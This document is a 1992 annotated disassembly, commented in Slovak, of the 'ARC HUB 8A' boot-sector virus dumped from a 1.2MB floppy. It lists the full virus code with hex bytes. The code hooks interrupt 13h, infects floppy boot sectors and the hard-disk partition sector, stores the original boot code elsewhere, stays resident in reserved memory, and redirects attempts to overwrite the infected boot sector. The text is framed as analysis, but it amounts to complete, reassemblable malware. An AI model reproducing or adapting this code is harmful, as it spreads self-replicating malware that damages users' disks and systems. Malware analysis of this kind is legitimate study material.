Virus "ARC HUB 8A", v�pis z boot sektoru diskety 1.2Mb.          8.2.1992.
                                Pavol DLHO�

7C00 EA0500C007     JMP    07C0:0000    ;po nainfikovan� zostane
7C05 E99900         JMP    7CA1     ;imm�nny proti STONEDu

7C08 00         DB     00       ;00=syst�m �tartovan� z diskety
                    ;02=syst�m �tartovan� z HD
7C09 007C0000       DD     7C000000 ;adresa skoku na p�vodn� boot
7C0D E400           DW     00E4     ;offset pre skok do rezidentnej oblasti
7C0F 809F       DW     9F80     ;segment rezidentnej �asti
7C11 EDC100F0       DD     C1EDF000 ;offset a segment p�vodnej adr. 13h

;rutina pre obsluhu int 13h
7C15 1E             PUSH   DS       ;uschovaj registre
7C16 50             PUSH   AX
7C17 80FC02         CMP    AH,02
7C1A 7217           JC     7C33
7C1C 80FC04         CMP    AH,04
7C1F 7312           JNC    7C33     ;ide o z�pis ? (funkcia 03)
7C21 E96201         JMP    7D86     ;�no, sko�
7C24 90             NOP
7C25 33C0           XOR    AX,AX
7C27 8ED8           MOV    DS,AX
7C29 A06C04         MOV    AL,[046C]
7C2C 3CF0           CMP    AL,F0
7C2E 7203           JC     7C33
7C30 E99900         JMP    7CCC
7C33 58             POP    AX       ;vyzdvihni registre
7C34 1F             POP    DS
7C35 2EFF2E1100     JMP    Far CS:[0011];sko� na p�vodn� obsluhu 13h
7C3A 53             PUSH   BX
7C3B 51             PUSH   CX       ;odlo� registre na z�sobn�k
7C3C 52             PUSH   DX
7C3D 06             PUSH   ES
7C3E 56             PUSH   SI
7C3F 57             PUSH   DI
7C40 BE0400         MOV    SI,0004  ;po�et opakovan� ��tania pri chybe
7C43 B80102         MOV    AX,0201
7C46 0E             PUSH   CS       ;pre��taj boot diskety
7C47 07             POP    ES
7C48 BB0002         MOV    BX,0200
7C4B 33C9           XOR    CX,CX
7C4D 8BD1           MOV    DX,CX
7C4F 41             INC    CX
7C50 9C             PUSHF
7C51 2EFF1E1100     CALL   Far CS:[0011]
7C56 730E           JNC    7C66     ;sko� ak nenastala chyba
7C58 33C0           XOR    AX,AX    ;pri chybe resetuj radi�
7C5A 9C             PUSHF       ;a opakuj ��tanie
7C5B 2EFF1E1100     CALL   Far CS:[0011]
7C60 4E             DEC    SI
7C61 75E0           JNZ    7C43
7C63 EB35           JMP    7C9A
7C65 90             NOP
7C66 33F6           XOR    SI,SI
7C68 BF0002         MOV    DI,0200
7C6B FC             CLD
7C6C 0E             PUSH   CS
7C6D 1F             POP    DS
7C6E AD             LODSW       ;poronaj �i je u� disketa nakazen�
7C6F 3B05           CMP    AX,[DI]
7C71 7506           JNZ    7C79     ;ak nie sko�
7C73 AD             LODSW
7C74 3B4502         CMP    AX,[DI+02]
7C77 7412           JZ     7C8B     ;ak u� je nakazen� sko�
7C79 B80103         MOV    AX,0301
7C7C BB0002         MOV    BX,0200  ;zap�� p�vodn� boot do 3.sektoru
7C7F B103           MOV    CL,03    ;0.stopy na 1.stranu
7C81 B601           MOV    DH,01
7C83 9C             PUSHF
7C84 2EFF1E1100     CALL   Far CS:[0011]
7C89 720F           JC     7C9A     ;sko� pri chybe
7C8B B80103         MOV    AX,0301
7C8E 33DB           XOR    BX,BX    ;zap�� sa do bootu diskety
7C90 B101           MOV    CL,01
7C92 33D2           XOR    DX,DX
7C94 9C             PUSHF
7C95 2EFF1E1100     CALL   Far CS:[0011]
7C9A 5F             POP    DI
7C9B 5E             POP    SI       ;obnov hodnoty registrov zo z�sobn�ka
7C9C 07             POP    ES
7C9D 5A             POP    DX
7C9E 59             POP    CX
7C9F 5B             POP    BX
7CA0 C3             RET         ;n�vrat 

;zav�dzacia rutinka : in�taluje nov� obsluhu preru�enia 13h, po nabootovan�
;z diskety nasleduje pokus o nainfikovanie partition HD a napokon spust�
;program ktor� obsahoval p�vodn� boot
7CA1 31C9           XOR    CX,CX
7CA3 8ED9           MOV    DS,CX
7CA5 FA             CLI
7CA6 8ED1           MOV    SS,CX
7CA8 BC007C         MOV    SP,7C00
7CAB FB             STI

;zisti adresu rutiny pre int 13h, a uschovaj ju
7CAC A14C00         MOV    AX,[004C]
7CAF A3117C         MOV    [7C11],AX
7CB2 A14E00         MOV    AX,[004E]
7CB5 A3137C         MOV    [7C13],AX
7CB8 EB58           JMP    7D12

7CBA 000000000000   DW     0,0,0    ;vo�n� miesto

7CC0 B106           MOV    CL,06    ;vyr�taj segment pre rezident
7CC2 D3E0           SHL    AX,CL
7CC4 8EC0           MOV    ES,AX
7CC6 A30F7C         MOV    [7C0F],AX    ;a uschovaj ho
7CC9 06             PUSH   ES
7CCA EB07           JMP    7CD3

7CCC E86BFF         CALL   7C3A
7CCF E961FF         JMP    7C33
7CD2 90             NOP

7CD3 B9BD01         MOV    CX,01BD  ;presun 1BD bytov v�ru na miesto
7CD6 0E             PUSH   CS       ;pre rezident
7CD7 1F             POP    DS       ;DS=0
7CD8 33F6           XOR    SI,SI    ;SI=0
7CDA 8BFE           MOV    DI,SI    ;DI=0
7CDC FC             CLD
7CDD F3A4           REP    MOVSB    ;presun
7CDF 2EFF2E0D00     JMP    Far CS:[000D];sko� na nasleduj�cu in�trukciu
                    ;ale v novom segmente
7CE4 B80000         MOV    AX,0000  ;resetuj radi�
7CE7 CD13           INT    13

;pre��taj odlo�en� p�vodn� boot, na diskete sa nach�dza na 3.sektore 0.stopy
;a 1.strane, na HD sa nach�dza v 7.sektore 0.stopy a 0.strane
7CE9 33C0           XOR    AX,AX        
7CEB 8EC0           MOV    ES,AX
7CED B80102         MOV    AX,0201
7CF0 BB007C         MOV    BX,7C00
7CF3 2E803E080000   CMP    CS:[0008],00 ;syst�m spusten� z diskety
7CF9 740B           JZ     7D06     ;�no, sko�
7CFB B90700         MOV    CX,0007
7CFE BA8000         MOV    DX,0080
7D01 CD13           INT    13
7D03 EB49           JMP    7D4E
7D05 90             NOP

7D06 B90300         MOV    CX,0003
7D09 BA0001         MOV    DX,0100
7D0C CD13           INT    13
7D0E 723E           JC     7D4E
7D10 EB18           JMP    7D2A

;zosta�e rezidentn� v posledn�ch 2Kb pam�ti, ktor� znepr�stupn� DOSu
7D12 A11304         MOV    AX,[0413]    ;pre��taj ve�kos� dostupnej pam�ti
7D15 48             DEC    AX       ;zn�� ju o 2
7D16 48             DEC    AX
7D17 A31304         MOV    [0413],AX    ;a zap�� nasp��
7D1A EBA4           JMP    7CC0

;text " ARC HUB 8A "
7D1C 20415243
7D20 20485542       DB     ' ARC HUB 8A ',00,00
7D24 20384120
7D27 0000

;ak nie je e�te infikovan� HD, sk�s ho nakazi�
7D2A 0E         PUSH   CS
7D2B 07B8       POP    DS
7D2C B80102     MOV    AX,0201  ;pre��taj partition HD
7D2F BB0002         MOV    BX,0200
7D32 B101           MOV    CL,01
7D34 BA8000         MOV    DX,0080
7D37 CD13           INT    13
7D39 7213           JC     7D4E     ;sko� ak po��ta� nem� HD
7D3B 0E             PUSH   CS
7D3C 1F             POP    DS
7D3D BE0002         MOV    SI,0200
7D40 BF0000         MOV    DI,0000  ;zisti �i je u� v�rus na HD
7D43 AD             LODSW
7D44 3B05           CMP    AX,[DI]
7D46 750E           JNZ    7D56     ;sko� ak nie
7D48 AD             LODSW
7D49 3B4502         CMP    AX,[DI+02]
7D4C 7508           JNZ    7D56
7D4E 2EC606080000   MOV    CS:[0008],00 ;zap�� identifika�n� bajt
7D54 EB52           JMP    7DA8
7D56 2EC606080002   MOV    CS:[0008],02 ;zap�� identifika�n� bajt
7D5C 0E             PUSH   CS
7D5D 1F             POP    DS
7D5E 0E             PUSH   CS
7D5F 07             POP    ES
7D60 BEBE03         MOV    SI,03BE
7D63 BFBE01         MOV    DI,01BE  ;skp�ruj tabu�ku part�ci� za seba
7D66 B94200         MOV    CX,0042
7D69 F3A4           REP    MOVSB
7D6B B80103         MOV    AX,0301
7D6E 31DB           XOR    BX,BX    ;a zap�� sa na HD
7D70 FEC1           INC    CL
7D72 BA8000         MOV    DX,0080
7D75 CD13           INT    13
7D77 72D5           JC     7D4E
7D79 B80103         MOV    AX,0301
7D7C BB0002         MOV    BX,0200  ;uschovaj p�vodn� partition
7D7F B90700         MOV    CX,0007
7D82 CD13           INT    13
7D84 EBC8           JMP    7D4E

;ak sa nejak� program pok��a prep�sa� zav�ren� boot disku alebo diskety, 
;tak namiesto neho prep��e podstr�en� prav� boot
7D86 83F901         CMP    CX,0001
7D89 7513           JNZ    7D9E
7D8B 81FA8000       CMP    DX,0080
7D8F 7503           JNZ    7D94     ;ak ide o z�pis na partition
7D91 B90700         MOV    CX,0007  ;prevedie sa na 7.sektore,
7D94 83FA00         CMP    DX,0000  ;kde je ulo�en� p�vodn� partition
7D97 7505           JNZ    7D9E     ;na diskete sa prevedie na 3.sektore
7D99 B90300         MOV    CX,0003  ;0.stope a 1.hlave
7D9C FEC6           INC    DH
7D9E 08D2           OR     DL,DL
7DA0 7403           JZ     7DA5
7DA2 E98EFE         JMP    7C33     ;sko� ak sa jedn� o HD
7DA5 E97DFE         JMP    7C25     ;sko� ak sa jedn� o disketu

;nastav nov� osluhu pre int 13h, potom sko� na p�vodn� boot
7DA8 31C0           XOR    AX,AX
7DAA 8ED8           MOV    DS,AX
7DAC B81500         MOV    AX,0015
7DAF A34C00         MOV    [004C],AX
7DB2 07             POP    ES
7DB3 8C064E00       MOV    [004E],ES
7DB7 2EFF2E0900     JMP    Far CS:[0009];skok na p�vodn� boot
7DBC            DUP    43 (?)   ;miesto vyhraden� pre tabu�ku part�ci�
